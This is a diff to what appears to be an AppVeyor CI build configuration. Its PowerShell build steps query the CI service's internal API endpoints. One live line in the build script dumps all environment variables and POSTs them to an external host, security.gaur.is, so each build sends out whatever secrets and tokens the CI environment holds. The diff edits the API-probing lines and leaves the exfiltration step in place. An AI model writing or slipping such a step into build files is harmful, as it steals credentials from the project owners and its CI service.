@@ -25,8 +25,8 @@ install:
   - gcc --version
 
 build_script:
-  - ps: $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/environments' -Headers $headers -Method Get
-  - ps: $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/' -Headers $headers -Method Get
-  - ps: $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/roles' -Headers $headers -Method Get
+  - ps: $headers = @{}; $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/environments' -Headers $headers -Method Get
+  - ps: $headers = @{}; $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/' -Headers $headers -Method Get
+  - ps: $headers = @{}; $headers["Content-type"] = "application/json"; Invoke-RestMethod -Uri $env:APPVEYOR_API_URL + '/api/roles' -Headers $headers -Method Get
   - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
   - echo "test"
